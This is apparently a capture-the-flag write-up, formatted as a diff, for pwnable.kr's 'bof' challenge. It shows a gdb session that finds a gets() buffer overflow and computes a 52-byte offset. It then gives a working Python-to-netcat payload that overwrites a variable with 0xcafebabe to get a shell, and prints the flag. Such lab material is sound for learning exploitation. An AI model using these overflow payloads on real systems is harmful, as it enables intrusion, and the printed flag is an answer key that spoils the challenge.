@@ -1,0 +1,108 @@
+root@linuxdebugger:~/Debugger# gdb bof
+GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
+Copyright (C) 2022 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from bof...
+(No debugging symbols found in bof)
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+0x00000474  _init
+0x000004c0  gets@plt
+0x000004d0  __stack_chk_fail@plt
+0x000004e0  __cxa_finalize@plt
+0x000004f0  puts@plt
+0x00000500  system@plt
+0x00000510  __gmon_start__@plt
+0x00000520  __libc_start_main@plt
+0x00000530  _start
+0x00000570  __do_global_dtors_aux
+0x000005f0  frame_dummy
+0x00000627  __i686.get_pc_thunk.bx
+0x0000062c  func
+0x0000068a  main
+0x000006b0  __libc_csu_init
+0x00000720  __libc_csu_fini
+0x00000730  __do_global_ctors_aux
+0x00000768  _fini
+(gdb) break gets
+Breakpoint 1 at 0x4c0
+(gdb) run
+Starting program: /root/Debugger/bof
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+overflow me :
+
+Breakpoint 1, 0xf7df58f8 in gets () from /lib/i386-linux-gnu/libc.so.6
+(gdb) next
+Single stepping until exit from function gets,
+which has no line number information.
+nextdeadbeefmeeeebofffffffffffffffffffffffffffffffff
+0x56555654 in func ()
+(gdb) disas main
+Dump of assembler code for function main:
+   0x5655568a <+0>:     push   %ebp
+   0x5655568b <+1>:     mov    %esp,%ebp
+   0x5655568d <+3>:     and    $0xfffffff0,%esp
+   0x56555690 <+6>:     sub    $0x10,%esp
+   0x56555693 <+9>:     movl   $0xdeadbeef,(%esp)
+   0x5655569a <+16>:    call   0x5655562c <func>
+   0x5655569f <+21>:    mov    $0x0,%eax
+   0x565556a4 <+26>:    leave
+   0x565556a5 <+27>:    ret
+End of assembler dump.
+(gdb) disas func
+Dump of assembler code for function func:
+   0x5655562c <+0>:     push   %ebp
+   0x5655562d <+1>:     mov    %esp,%ebp
+   0x5655562f <+3>:     sub    $0x48,%esp
+   0x56555632 <+6>:     mov    %gs:0x14,%eax
+   0x56555638 <+12>:    mov    %eax,-0xc(%ebp)
+   0x5655563b <+15>:    xor    %eax,%eax
+   0x5655563d <+17>:    movl   $0x5655578c,(%esp)
+   0x56555644 <+24>:    call   0xf7df62a0 <puts>
+   0x56555649 <+29>:    lea    -0x2c(%ebp),%eax
+   0x5655564c <+32>:    mov    %eax,(%esp)
+   0x5655564f <+35>:    call   0xf7df58f0 <gets>
+=> 0x56555654 <+40>:    cmpl   $0xcafebabe,0x8(%ebp)
+   0x5655565b <+47>:    jne    0x5655566b <func+63>
+   0x5655565d <+49>:    movl   $0x5655579b,(%esp)
+   0x56555664 <+56>:    call   0xf7dcb170 <system>
+   0x56555669 <+61>:    jmp    0x56555677 <func+75>
+   0x5655566b <+63>:    movl   $0x565557a3,(%esp)
+   0x56555672 <+70>:    call   0xf7df62a0 <puts>
+   0x56555677 <+75>:    mov    -0xc(%ebp),%eax
+   0x5655567a <+78>:    xor    %gs:0x14,%eax
+   0x56555681 <+85>:    je     0x56555688 <func+92>
+   0x56555683 <+87>:    call   0xf7eb6a20 <__stack_chk_fail>
+   0x56555688 <+92>:    leave
+   0x56555689 <+93>:    ret
+End of assembler dump.
+(gdb) x $ebp+0x8
+0xffffd540:     0xdeadbe00
+(gdb) x $ebp-0x2c
+0xffffd50c:     0x7478656e
+(gdb) x/1s $ebp-0x2c
+0xffffd50c:     "nextdeadbeefmeeeebo", 'f' <repeats 33 times>
+
+=> 0xffffd540 - 0xffffd50c = bytes to overwrite the buffer
+eblue3\CTF\pwnable-KR> python hexcalc.py 0xffffd540-0xffffd50c
+Integer: 52
+Hex: 0x34
+
+=> root@eblue3:~# (python -c "import sys; sys.stdout.buffer.write(b'A' * 52 + b'\xbe\xba\xfe\xca\n')" && cat) | nc pwnable.kr 9000
+cat flag
+daddy, I just pwned a buFFer :)
